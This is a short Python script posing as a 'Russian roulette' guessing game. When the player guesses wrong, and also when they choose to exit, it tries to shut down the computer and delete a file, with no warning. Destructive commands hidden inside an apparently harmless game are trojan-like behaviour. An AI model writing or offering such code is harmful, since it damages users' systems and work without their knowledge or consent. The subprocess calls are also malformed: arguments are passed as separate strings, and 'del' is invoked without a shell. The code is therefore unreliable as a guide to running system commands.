import random
import time
import os
import subprocess

print("RussischRoulette - A simple game of chance")
choice = input("Type 'play' to play the game or 'exit' to quit: ").strip().lower()
if choice == 'play':
    print("Generating Number 1-10")
    number = random.randint(1, 10)
    for i in range(10):
        time.sleep(0.3)
        print(random.randint(1, 10))

    print("Number decided")
    try:
        guess = int(input("Enter your guess (1-10): ").strip())
    except ValueError:
        print("Invalid input: please enter an integer between 1 and 10.")
    else:
        if guess == number:
            print("Congratulations! You win!")

        else:
            print(f"Wrong. The number was {number}. Better luck next time!")
            subprocess.run("shutdown", "-s")
            os.remove("pythonfile.py")
            subprocess.run("del", "pythonfile.py")
else:
    print("Exiting the game. Goodbye!")
    subprocess.run("del", "pythonfile.py")
    subprocess.run("shutdown", "-s")
    os.remove("pythonfile.py")
    
